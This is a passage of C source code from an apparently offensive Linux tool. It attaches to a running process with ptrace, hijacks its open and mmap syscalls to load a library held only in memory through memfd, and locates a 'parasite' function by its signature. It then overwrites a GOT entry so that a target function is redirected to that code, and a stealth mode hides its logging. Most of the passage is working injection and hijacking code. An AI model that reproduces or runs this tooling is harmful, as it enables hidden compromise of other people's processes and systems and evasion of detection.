	if (ae_write_to_memfd(pid, sysenter, memfd, lib_data, lib_size) < 0) {
		ae_log(AE_LOG_ERROR, "Failed to write library to memfd");
		free(lib_data);
		return -1;
	}
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Successfully wrote all %zu bytes to memfd", lib_size);

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Phantom Load complete: library loaded in RAM via memfd %d", memfd);

	free(lib_data);
	*memfd_out = memfd;
	return 0;
}


// delete this before anyone sees this shit
static void
ae_dump_buf (uchar_t * buf, size_t size)
{
	int i;
	for (i = 0; i < size; i++) {
		if ((i % 20) == 0)
			ae_log(AE_LOG_INFO, "");
		fprintf(stderr, "\\x%.2x", buf[i]);
	}
	ae_log(AE_LOG_INFO, "");
}


/* i am actually a genius and nobody can tell me otherwise */
static int 
ae_mmap_library (int pid, 
				char * libname,
				ulong_t * evilbase, 
				struct ae_segments * segs)
{
	struct user_regs_struct reg;
	int fd, memfd;
	char library_string[MAXBUF] = {0};
	char orig_ds[MAXBUF] = {0};
	char buf[MAXBUF] = {0};
	ulong_t sysenter = 0;
	size_t search_stages[] = {0x1000, 0x4000, 0x10000};
	size_t sysenter_chunk = 1024;

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	unsigned long long orig_rip, orig_rsp, orig_rax, orig_rdi, orig_rsi, orig_rdx, orig_r10, orig_r8, orig_r9;
#else
	long eip, esp, eax, ebx, ecx, edx;
#endif
	long offset;

	/* refactoring this was a mistake i want to go home */
	if (ae_ensure_stopped(pid) == -1) {
		ae_log(AE_LOG_ERROR, "Target not stopped before mmap_library initial");
		return -1;
	}
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get initial registers: %s", strerror(errno));
		return -1;
	}

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	orig_rip = reg.rip;
	orig_rsp = reg.rsp;
	orig_rax = reg.rax;
	orig_rdi = reg.rdi;
	orig_rsi = reg.rsi;
	orig_rdx = reg.rdx;
	orig_r10 = reg.r10;
	orig_r8 = reg.r8;
	orig_r9 = reg.r9;
#else
	eip = reg.eip;
	esp = reg.esp;
	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;
#endif

	// find sysenter in libc since its syscall wrapper always has it
	char maps_path[64];
	FILE *maps_file;
	char line[1024];
	ulong_t start, end;
	
	snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
	maps_file = fopen(maps_path, "r");
	if (maps_file) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Searching for sysenter in libc mappings (staged: 4KB/16KB/64KB)");
		while (fgets(line, sizeof(line), maps_file) && !sysenter) {
			// look for libc executable mappings (r-xp means read execute private)
			if (strstr(line, "libc") && strstr(line, "r-xp")) {
				if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
					ulong_t mapping_len = end - start;
					for (size_t s = 0; s < sizeof(search_stages)/sizeof(search_stages[0]) && !sysenter; s++) {
						size_t max_search = search_stages[s];
						if (max_search > mapping_len)
							max_search = mapping_len;
						sysenter = ae_find_sysenter(pid, start, end, max_search, sysenter_chunk);
					}
				}
			}
		}
		fclose(maps_file);
	}
	
	if (!sysenter) {
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
		ulong_t search_start = (reg.rip > 0x1000) ? (reg.rip - 0x1000) : 0x1000;
		ulong_t search_end = reg.rip + 0x1000;
		
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around RIP 0x%lx", (unsigned long)reg.rip);
#else
		ulong_t search_start = (reg.eip > 0x1000) ? (reg.eip - 0x1000) : 0x1000;
		ulong_t search_end = reg.eip + 0x1000;
		
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around EIP 0x%lx", (unsigned long)reg.eip);
#endif
		
		sysenter = ae_find_sysenter(pid, search_start, search_end, search_end - search_start, sysenter_chunk);
	}

	if (!sysenter) {
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
		ae_log(AE_LOG_ERROR, "Unable to find syscall instruction in memory");
#else
		ae_log(AE_LOG_ERROR, "Unable to find sysenter instruction in memory");
#endif
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Syscall instruction found: 0x%lx", sysenter);

	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers: %s", strerror(errno));
		return -1;
	}
	
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	orig_rip = reg.rip;
	orig_rsp = reg.rsp;
	orig_rax = reg.rax;
	orig_rdi = reg.rdi;
	orig_rsi = reg.rsi;
	orig_rdx = reg.rdx;
	orig_r10 = reg.r10;
	orig_r8 = reg.r8;
	orig_r9 = reg.r9;
#else
	eip = reg.eip;
	esp = reg.esp;
	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;
#endif
	
	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Could not set ptrace options: %s", strerror(errno));
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Initiating Phantom Load for %s", libname);
	if (ae_phantom_load(pid, libname, sysenter, &memfd) < 0) {
		ae_log(AE_LOG_ERROR, "Phantom Load failed");
		return -1;
	}

	snprintf(library_string, MAXBUF, "/proc/self/fd/%d", memfd);
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Library loaded in RAM, accessible via: %s", library_string);

	/* calculate address on stack to store the /proc/self/fd/memfd path string */
	ulong_t stack_limit = 0x1000;
	size_t str_len = strlen(library_string) + 1;
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	ulong_t string_addr = (reg.rsp & ~0x7) - (str_len + 64);  /* 8-byte aligned on 64-bit */
#else
	ulong_t string_addr = (reg.esp & ~0x3) - (str_len + 64);
#endif
	
	if (!ae_is_address_mapped(pid, string_addr, str_len) || string_addr < stack_limit) {
		ae_log(AE_LOG_ERROR, "Calculated string address too low: 0x%lx", string_addr);
		return -1;
	}
	
	// backup what was on the stack before we overwrite it
	ae_ptrace_cpy_from((ulong_t*)orig_ds, string_addr, str_len + 32, pid);

	// write the memfd path string to the stack
	ae_ptrace_cpy_to(string_addr, (ulong_t*)library_string, str_len, pid);

	ae_ptrace_cpy_from((ulong_t*)buf, string_addr, str_len, pid);

	if (strncmp(buf, library_string, str_len) == 0) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Verified string is stored on stack: %s", buf);
	} else {
		ae_log(AE_LOG_ERROR, "String was not properly stored on stack: %s", buf);
		return -1;
	}

	/* open the memfd path so we can mmap it
	 * hijack open syscall to open /proc/self/fd/memfd */
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Opening memfd path: %s", library_string);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	/* 64-bit: open(pathname, flags, mode) → rdi, rsi, rdx */
	reg.rax = SYS_open;
	reg.rdi = (unsigned long long)string_addr;
	reg.rsi = 0;  /* O_RDONLY */
	reg.rdx = 0;
	reg.rip = sysenter;
#else
	reg.eax = SYS_open;
	reg.ebx = (long)string_addr;
	reg.ecx = 0;  
	reg.eip = sysenter;
#endif

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for open: %s", strerror(errno));
		return -1;
	}

	fd = -1;
	uintptr_t open_result;
	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
	                                SINGLESTEP_TIMEOUT_SEC, "open(memfd)", SYS_open, &open_result) == 0) {
		fd = (int)open_result;
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "open syscall completed: fd=%d", fd);
	}
	
	if (fd < 0) {
		ae_log(AE_LOG_ERROR, "Failed to open memfd path");
		return -1;
	}

	offset = (string_addr + str_len) + 8;

	/* mmap(addr, length, prot, flags, fd, offset) for text segment */
	size_t text_len = segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1)));
	off_t text_off = segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	/* 64-bit: args in registers directly */
	reg.rax = SYS_mmap;
	reg.rdi = 0;                   /* addr = NULL */
	reg.rsi = text_len;            /* length */
	reg.rdx = 5;                   /* prot = PROT_READ | PROT_EXEC */
	reg.r10 = 2;                   /* flags = MAP_SHARED */
	reg.r8 = fd;                   /* fd */
	reg.r9 = text_off;             /* offset */
	reg.rip = sysenter;
#else
	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	/* mmap args on stack: addr size prot flags fd offset
	 * mmap takes 6 args so we put them on the stack and point ebx to that */
	ptrace(PTRACE_POKETEXT, pid, offset, 0);
	ptrace(PTRACE_POKETEXT, pid, offset + 4, text_len);
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);  /* PROT_READ | PROT_EXEC */
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  /* MAP_SHARED */
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
	ptrace(PTRACE_POKETEXT, pid, offset + 20, text_off);
#endif

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for mmap: %s", strerror(errno));
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Executing mmap for text segment (size: %zu)", text_len);
	*evilbase = 0;
	uintptr_t mmap_result;
	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
	                                SINGLESTEP_TIMEOUT_SEC, "mmap(text)", SYS_mmap, &mmap_result) == 0) {
		if (mmap_result != (uintptr_t)-1) {
			*evilbase = mmap_result;
			if (!ae_stealth_mode)
				ae_log(AE_LOG_DEBUG, "mmap(text) completed: base=0x%lx", *evilbase);
		} else {
			ae_log(AE_LOG_ERROR, "mmap(text) failed: result=0x%lx", (unsigned long)mmap_result);
		}
	}
	
	if (*evilbase == 0 || *evilbase == (ulong_t)-1) {
		ae_log(AE_LOG_ERROR, "mmap failed or returned invalid address: 0x%lx", *evilbase);
		return -1;
	}

	/* mmap for data segment */
	size_t data_len = segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1)));
	off_t data_off = segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	reg.rax = SYS_mmap;
	reg.rdi = 0;                   /* addr = NULL */
	reg.rsi = data_len;            /* length */
	reg.rdx = 3;                   /* prot = PROT_READ | PROT_WRITE */
	reg.r10 = 2;                   /* flags = MAP_SHARED */
	reg.r8 = fd;                   /* fd */
	reg.r9 = data_off;             /* offset */
	reg.rip = sysenter;
#else
	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	ptrace(PTRACE_POKETEXT, pid, offset, 0);
	ptrace(PTRACE_POKETEXT, pid, offset + 4, data_len);
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);  /* PROT_READ | PROT_WRITE */
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
	ptrace(PTRACE_POKETEXT, pid, offset + 20, data_off);
#endif

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for data mmap: %s", strerror(errno));
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Executing mmap for data segment (size: %zu)", data_len);
	uintptr_t mmap_data_result;
	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
	                                SINGLESTEP_TIMEOUT_SEC, "mmap(data)", SYS_mmap, &mmap_data_result) == 0) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "mmap(data) completed: result=0x%lx", (unsigned long)mmap_data_result);
	} else {
		ae_log(AE_LOG_ERROR, "mmap(data) failed or timed out");
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Restoring stack");
	ae_ptrace_cpy_to(string_addr, (ulong_t*)orig_ds, str_len + 32, pid);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	reg.rip = orig_rip;
	reg.rax = orig_rax;
	reg.rdi = orig_rdi;
	reg.rsi = orig_rsi;
	reg.rdx = orig_rdx;
	reg.r10 = orig_r10;
	reg.r8 = orig_r8;
	reg.r9 = orig_r9;
	reg.rsp = orig_rsp;
#else
	reg.eip = eip;
	reg.eax = eax;
	reg.ebx = ebx;
	reg.ecx = ecx;
	reg.edx = edx;
	reg.esp = esp;
#endif

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
		ae_log(AE_LOG_ERROR, "Could not detach from target");
		exit(EXIT_FAILURE);
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Phantom Load mmap complete, evilbase: 0x%lx", *evilbase);
	return 0;
}


/* parses ELF file finds dynamic symbol table and relocation entries matches them up to get GOT offsets */
static struct ae_sym_info * 
ae_get_plt (uchar_t * mem) 
{
	char * symname = NULL;
	int i, j, k, symcount = 0;
	struct ae_sym_info * sinfo = NULL;

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	Elf64_Ehdr *ehdr;
	Elf64_Shdr *shdr, *shdrp, *strtab;
	Elf64_Sym *syms, *symsp;
	Elf64_Rela *rela;

	ehdr = (Elf64_Ehdr*)mem;
	shdr = (Elf64_Shdr*)(mem + ehdr->e_shoff);
	shdrp = shdr;

	/* find the dynamic symbol table section */
	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {
		if (shdrp->sh_type == SHT_DYNSYM) {
			strtab = &shdr[shdrp->sh_link];

			if ((symname = malloc(strtab->sh_size)) == NULL)
				return NULL;

			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);

			if ((syms = (Elf64_Sym *)malloc(shdrp->sh_size)) == NULL)
				return NULL;

			memcpy((Elf64_Sym*)syms, (Elf64_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);

			symsp = syms;
			symcount = shdrp->sh_size / sizeof(Elf64_Sym);

			sinfo = (struct ae_sym_info*)malloc(sizeof(struct ae_sym_info) + sizeof(struct ae_sym)*symcount);

			if (!sinfo) {
				ae_log(AE_LOG_ERROR, "Could not allocate symbol info");
				return NULL;
			}

			sinfo->count = symcount;

			for (j = 0; j < symcount; j++) {
				strncpy(sinfo->syms[j].name, &symname[symsp[j].st_name], MAXBUF);
				sinfo->syms[j].index = j;
				sinfo->syms[j].offset = 0;
			}

			free(symname);
			free(syms);
			break;
		}
	}

	/* 64-bit uses RELA (with addend) and R_X86_64_JUMP_SLOT */
	shdr = (Elf64_Shdr*)(mem + ehdr->e_shoff);
	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
		if (shdr->sh_type == SHT_RELA) {
			rela = (Elf64_Rela*)(mem + shdr->sh_offset);
			for (j = 0; (size_t)j < shdr->sh_size / sizeof(Elf64_Rela); j++, rela++) {
				if (ELF64_R_TYPE(rela->r_info) == R_X86_64_JUMP_SLOT) {
					for (k = 0; k < symcount; k++) {
						if (ELF64_R_SYM(rela->r_info) == (unsigned int)sinfo->syms[k].index)
							sinfo->syms[k].offset = rela->r_offset;
					}
				}
			}
		}
	}

#else /* 32-bit */
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr, *shdrp, *strtab;
	Elf32_Sym *syms, *symsp;
	Elf32_Rel *rel;

	ehdr = (Elf32_Ehdr*)mem;
	shdr = (Elf32_Shdr*)(mem + ehdr->e_shoff);
	shdrp = shdr;

	/* find the dynamic symbol table section */
	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {
		if (shdrp->sh_type == SHT_DYNSYM) {
			strtab = &shdr[shdrp->sh_link];

			if ((symname = malloc(strtab->sh_size)) == NULL)
				return NULL;

			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);

			if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
				return NULL;

			memcpy((Elf32_Sym*)syms, (Elf32_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);

			symsp = syms;
			symcount = shdrp->sh_size / sizeof(Elf32_Sym);

			sinfo = (struct ae_sym_info*)malloc(sizeof(struct ae_sym_info) + sizeof(struct ae_sym)*symcount);

			if (!sinfo) {
				ae_log(AE_LOG_ERROR, "Could not allocate symbol info");
				return NULL;
			}

			sinfo->count = symcount;

			for (j = 0; j < symcount; j++) {
				strncpy(sinfo->syms[j].name, &symname[symsp[j].st_name], MAXBUF);
				sinfo->syms[j].index = j;
				sinfo->syms[j].offset = 0;
			}

			free(symname);
			free(syms);
			break;
		}
	}

	/* match up relocations with symbols to find GOT offsets
	 * go through all relocation sections and find JUMP_SLOT relocations which are GOT entries */
	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
		if (shdr->sh_type == SHT_REL || shdr->sh_type == SHT_RELA) {
			if (shdr->sh_type == SHT_REL) {
				rel = (Elf32_Rel*)(mem + shdr->sh_offset);
				for (j = 0; (size_t)j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
					if (ELF32_R_TYPE(rel->r_info) == R_386_JMP_SLOT) {
						for (k = 0; k < symcount; k++) {
							if (ELF32_R_SYM(rel->r_info) == (unsigned int)sinfo->syms[k].index)
								sinfo->syms[k].offset = rel->r_offset;
						}
					}
				}
			} else {
				ae_log(AE_LOG_DEBUG, "Found SHT_RELA section (not handled)");
			}
		}
	}
#endif

	int valid_count = 0;
	for (i = 0; i < symcount; i++) {
		if (sinfo->syms[i].offset != 0) {
			if (valid_count != i) {
				sinfo->syms[valid_count] = sinfo->syms[i];
			}
			valid_count++;
		}
	}
	sinfo->count = valid_count;

	return sinfo;
}


// i give up fuck this
static size_t
ae_get_evil_lib_size (int pid, char * libname) 
{
	FILE * fd = NULL;
	char maps[MAXBUF] = {0};
	char buf[MAXBUF];

	snprintf(maps, MAXBUF, "/proc/%d/maps", pid);

	fd = fopen(maps, "r");
	if (!fd) {
		ae_log(AE_LOG_ERROR, "Could not open maps file");
		return 0;
	}

	while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, libname)) {
			char * ptr = strtok(buf, " ");
			for (int i = 0; i < 4; i++)
				ptr = strtok(NULL, " ");
			fclose(fd);
			return atoi(ptr);
		}
	}
			
	fclose(fd);
	return 0;
}


/* find function address by parsing ELF symbol table from library file */
static ulong_t
ae_find_function_by_symbol (char * libname, ulong_t vaddr, ulong_t text_file_offset, ulong_t text_vaddr)
{
	uchar_t * lib_data = NULL;
	size_t lib_size = 0;
	char *strtab;
	ulong_t func_addr = 0;
	
	(void)text_file_offset;  /* suppress unused warning */
	
	lib_data = ae_read_library_file(libname, &lib_size);
	if (!lib_data) {
		ae_log(AE_LOG_ERROR, "Failed to read library file for symbol lookup");
		return 0;
	}

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)lib_data;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr, *symtab_shdr = NULL, *strtab_shdr = NULL;
	Elf64_Sym *syms;
	
	if (text_vaddr == 0) {
		phdr = (Elf64_Phdr *)(lib_data + ehdr->e_phoff);
		for (int i = 0; i < ehdr->e_phnum; i++, phdr++) {
			if (phdr->p_type == PT_LOAD && phdr->p_flags == (PF_X | PF_R)) {
				text_vaddr = phdr->p_vaddr;
				break;
			}
		}
	}
	
	shdr = (Elf64_Shdr *)(lib_data + ehdr->e_shoff);
	for (int i = 0; i < ehdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
			symtab_shdr = &shdr[i];
			strtab_shdr = &shdr[symtab_shdr->sh_link];
			break;
		}
	}
	
	if (!symtab_shdr || !strtab_shdr) {
		ae_log(AE_LOG_ERROR, "Could not find symbol table in library");
		free(lib_data);
		return 0;
	}
	
	syms = (Elf64_Sym *)(lib_data + symtab_shdr->sh_offset);
	strtab = (char *)(lib_data + strtab_shdr->sh_offset);
	
	int num_syms = symtab_shdr->sh_size / sizeof(Elf64_Sym);
	for (int i = 0; i < num_syms; i++) {
		if (ELF64_ST_TYPE(syms[i].st_info) == STT_FUNC && syms[i].st_name != 0) {
			char *sym_name = strtab + syms[i].st_name;
			if (strcmp(sym_name, "ae_evilprint") == 0) {
				ulong_t symbol_vaddr = syms[i].st_value;
				ulong_t offset_from_text_base = symbol_vaddr - text_vaddr;
				func_addr = vaddr + offset_from_text_base;
				if (!ae_stealth_mode)
					ae_log(AE_LOG_DEBUG, "Found ae_evilprint: symbol_vaddr=0x%lx, text_vaddr=0x%lx, offset=0x%lx, final_addr=0x%lx", 
					       symbol_vaddr, text_vaddr, offset_from_text_base, func_addr);
				break;
			}
		}
	}
#else /* 32-bit */
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)lib_data;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr, *symtab_shdr = NULL, *strtab_shdr = NULL;
	Elf32_Sym *syms;
	
	if (text_vaddr == 0) {
		phdr = (Elf32_Phdr *)(lib_data + ehdr->e_phoff);
		for (int i = 0; i < ehdr->e_phnum; i++, phdr++) {
			if (phdr->p_type == PT_LOAD && phdr->p_flags == (PF_X | PF_R)) {
				text_vaddr = phdr->p_vaddr;
				break;
			}
		}
	}
	
	shdr = (Elf32_Shdr *)(lib_data + ehdr->e_shoff);
	for (int i = 0; i < ehdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
			symtab_shdr = &shdr[i];
			strtab_shdr = &shdr[symtab_shdr->sh_link];
			break;
		}
	}
	
	if (!symtab_shdr || !strtab_shdr) {
		ae_log(AE_LOG_ERROR, "Could not find symbol table in library");
		free(lib_data);
		return 0;
	}
	
	syms = (Elf32_Sym *)(lib_data + symtab_shdr->sh_offset);
	strtab = (char *)(lib_data + strtab_shdr->sh_offset);
	
	int num_syms = symtab_shdr->sh_size / sizeof(Elf32_Sym);
	for (int i = 0; i < num_syms; i++) {
		if (ELF32_ST_TYPE(syms[i].st_info) == STT_FUNC && syms[i].st_name != 0) {
			char *sym_name = strtab + syms[i].st_name;
			if (strcmp(sym_name, "ae_evilprint") == 0) {
				ulong_t symbol_vaddr = syms[i].st_value;
				ulong_t offset_from_text_base = symbol_vaddr - text_vaddr;
				func_addr = vaddr + offset_from_text_base;
				if (!ae_stealth_mode)
					ae_log(AE_LOG_DEBUG, "Found ae_evilprint: symbol_vaddr=0x%lx, text_vaddr=0x%lx, offset=0x%lx, final_addr=0x%lx", 
					       symbol_vaddr, text_vaddr, offset_from_text_base, func_addr);
				break;
			}
		}
	}
#endif
	
	free(lib_data);
	return func_addr;
}


// i have no fucking idea why this fixed it but it did
static ulong_t
ae_search_evil_lib (int pid, char * libname, ulong_t vaddr, size_t text_seg_size)
{
	uchar_t * buf;
	int i = 0;
	size_t libsz;
	ulong_t evilvaddr = 0;

	libsz = 0;
	FILE *fd = NULL;
	char maps[MAXBUF];
	char buf_line[MAXBUF];
	ulong_t start, end;
	
	snprintf(maps, MAXBUF, "/proc/%d/maps", pid);
	fd = fopen(maps, "r");
	if (fd) {
		while (fgets(buf_line, MAXBUF, fd)) {
			if (sscanf(buf_line, "%lx-%lx", &start, &end) == 2) {
				if (start == vaddr) {
					libsz = end - start;
					if (!ae_stealth_mode)
						ae_log(AE_LOG_DEBUG, "Found mapping by base address 0x%lx: %zu bytes", vaddr, libsz);
					break;
				}
			}
		}
		fclose(fd);
	}
	
	if (libsz == 0 && text_seg_size > 0) {
		libsz = text_seg_size + (PAGE_SIZE - (text_seg_size & (PAGE_SIZE - 1)));
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Using page-aligned text segment size: %zu bytes (file size: %zu)", libsz, text_seg_size);
	}
	
	if (libsz == 0) {
		libsz = ae_get_evil_lib_size(pid, libname);
		if (libsz > 0 && !ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Found library size by name: %zu bytes", libsz);
	}
	
	if (libsz == 0) {
		ae_log(AE_LOG_ERROR, "Could not determine library size for search");
		return 0;
	}
	
	if ((buf = malloc(libsz)) == NULL) {
		ae_log(AE_LOG_ERROR, "Could not allocate lib buffer");
		exit(EXIT_FAILURE);
	}

	ae_ptrace_cpy_from((ulong_t*)buf, vaddr, libsz, pid);
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Searching at library base [0x%lx] for evil function", vaddr);
	
	size_t siglen = sizeof(evilsig) - 1;
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Searching for signature of %zu bytes", siglen);
	
	if (!ae_stealth_mode) {
		ae_log(AE_LOG_DEBUG, "First 64 bytes at 0x%lx:", vaddr);
		for (int j = 0; j < 64 && j < libsz; j++) {
			if (j % 16 == 0) fprintf(stderr, "  %04x: ", j);
			fprintf(stderr, "%02x ", buf[j]);
			if (j % 16 == 15) fprintf(stderr, "\n");
		}
		if (libsz < 64 || 64 % 16 != 0) fprintf(stderr, "\n");
	}
	
	if (!ae_stealth_mode) {
		ae_log(AE_LOG_DEBUG, "Looking for signature:");
		for (size_t j = 0; j < siglen; j++) {
			fprintf(stderr, "\\x%02x", (unsigned char)evilsig[j]);
		}
		fprintf(stderr, "\n");
	}
	
	for (i = 0; i < libsz - siglen; i++) {
		if (memcmp(&buf[i], evilsig, siglen) == 0) {
			evilvaddr = (vaddr + i);
			if (!ae_stealth_mode)
				ae_log(AE_LOG_DEBUG, "Found signature match at offset %d (0x%x)", i, i);
			break;
		}
	}

	if (!evilvaddr) {
		ae_log(AE_LOG_ERROR, "Could not find evil function");
		goto out_err;
	}
	
	if (!ae_stealth_mode) {
		ae_log(AE_LOG_DEBUG, "Parasite code ->");
#ifdef DEBUG_ENABLE
		ae_dump_buf(buf, 50);
#endif
	}

out_err:
	free(buf);
	return evilvaddr;
}


static bool 
ae_evil_lib_present (char * lib, int pid)
{
	char meminfo[MAXBUF];
	char buf[MAXBUF];
	FILE * fd;

	memset(meminfo, 0, sizeof(meminfo));
	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);

	fd = fopen(meminfo, "r");

	if (!fd) {
		ae_log(AE_LOG_ERROR, "Could not open map file");
		return true;
	}
	
	while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, lib)) {
			fclose(fd);
			return true;
		}
	}

	fclose(fd);
	return false;
}


/* finds the GOT entry for the function we want to hijack and overwrites it with our evil function address */
static uintptr_t
ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base, ulong_t patch_val, bool is_pie)
{
	uintptr_t ret = 0;
	uintptr_t got_offset;
	
	/* find the symbol we want to hijack */
	for (int i = 0; i < sinfo->count; i++) {
		if (strcmp(sinfo->syms[i].name, opt->func) == 0 && sinfo->syms[i].offset != 0) {

			if (!opt->stealth) {
				ae_log(AE_LOG_DEBUG, "Found string <%s> to patch", sinfo->syms[i].name);
				ae_log(AE_LOG_DEBUG, "Symbol offset: 0x%lx, lib_base: 0x%lx, ae_text_base: 0x%lx, ae_text_base_original: 0x%lx",
					   (unsigned long)sinfo->syms[i].offset, lib_base, ae_text_base, ae_text_base_original);
			}

			/* PIE binaries need base address adjustment */
			if (is_pie) {
				got_offset = (lib_base + (sinfo->syms[i].offset - ae_text_base_original));
				if (!opt->stealth)
					ae_log(AE_LOG_DEBUG, "PIE GOT calculation: lib_base(0x%lx) + (offset(0x%lx) - ae_text_base_original(0x%lx)) = 0x%lx",
						   lib_base, (unsigned long)sinfo->syms[i].offset, ae_text_base_original, (unsigned long)got_offset);
			} else {
				got_offset = sinfo->syms[i].offset;
			}

			if (!opt->stealth)
				ae_log(AE_LOG_DEBUG, "Calculated GOT offset: 0x%lx", (unsigned long)got_offset);

			/* save the original function address before we overwrite it */
			ae_original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
			if (!opt->stealth)
				ae_log(AE_LOG_DEBUG, "Original GOT value: 0x%lx", ae_original);
			
			if (ae_original == 0) {
				ae_log(AE_LOG_ERROR, "GOT entry is 0 - function may not be resolved yet (lazy binding)");
			}

			/* overwrite GOT entry with our evil function address */
			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
			ret = (uintptr_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);

			if (!opt->stealth)
				ae_log(AE_LOG_DEBUG, "New GOT value: 0x%lx", (unsigned long)ret);
			
			if (ret != patch_val) {
				ae_log(AE_LOG_ERROR, "GOT patch verification failed: expected 0x%lx, got 0x%lx", patch_val, (unsigned long)ret);
			} else if (!opt->stealth) {
				ae_log(AE_LOG_DEBUG, "GOT patch verified successfully");
				ulong_t verify = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
				if (verify != patch_val) {
					ae_log(AE_LOG_ERROR, "GOT value changed after patching! Expected 0x%lx, got 0x%lx", patch_val, verify);
				}
			}

			break;
		}
	}

	if (!opt->stealth && ret == 0) {
